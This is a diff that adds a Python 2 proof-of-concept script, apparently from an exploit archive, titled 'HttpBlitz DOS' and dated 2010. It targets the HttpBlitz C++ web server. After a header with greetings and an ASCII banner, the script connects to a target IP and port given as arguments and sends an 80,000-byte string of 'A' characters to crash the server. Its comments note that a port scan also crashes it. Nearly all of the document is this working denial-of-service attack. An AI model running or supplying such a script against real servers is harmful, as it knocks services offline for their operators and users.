@@ -1,0 +1,55 @@
+#!/usr/bin/python
+ 
+# Title: HttpBlitz DOS
+# Date: 12/24/2010
+# Author: otoy
+# Software Link: http://sourceforge.net/projects/httpblitz/files/HttpBlitz.msi/download
+# Tested on: Windows XP SP3
+#
+# ======================================================================
+#        ___       _ __        __            __    _     __
+#   ____/ (_)___ _(_) /_____ _/ / ___  _____/ /_  (_)___/ /___  ____ _
+#  / __  / / __ `/ / __/ __ `/ / / _ \/ ___/ __ \/ / __  / __ \/ __ `/
+# / /_/ / / /_/ / / /_/ /_/ / / /  __/ /__/ / / / / /_/ / / / / /_/ /
+# \__,_/_/\__, /_/\__/\__,_/_/  \___/\___/_/ /_/_/\__,_/_/ /_/\__,_/
+#        /____/                          http://www.digital-echidna.org
+# ======================================================================
+#
+# Greetz:
+#   say hello to all digital-echidna org crew:
+#       modpr0be, bean, s3o, d00m, n0rf0x, fm, gotechidna, manix
+#   special thx to offsec, exploit-db, corelan team
+#
+#### Software description:
+# A cross platform Http web server developed using C++. Agile methodology 
+# with emphasis on :- 1. Good Design 2. Object Oriented Programming 3. 
+# Refactoring 4. Static/Dynamic Analysis, Unit-testing, Code Coverage 5. 
+# Software Engineering best practices.  
+#
+#### DOS information:
+# you just have to send long string, and it will crash the program
+# just scanning the the port using nmap will crash the program too. :D
+ 
+import socket, sys
+s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+ 
+junk = "\x41" * 80000
+ 
+def banner():
+    print "\nHttpBlitz DOS."
+    print "By: otoy (otoy[at]digital-echidna[dot]org)\n"
+ 
+     
+if len(sys.argv)!=3:
+        banner()
+        print "Usage: %s <ip> <port>\n" %sys.argv[0]
+        sys.exit(0)
+ 
+try:
+    s.connect((sys.argv[1], int(sys.argv[2])))
+except:
+    print "Can\'t connect to server!\n"
+    sys.exit(0)
+     
+s.send(junk+'\r\n')
+s.close()
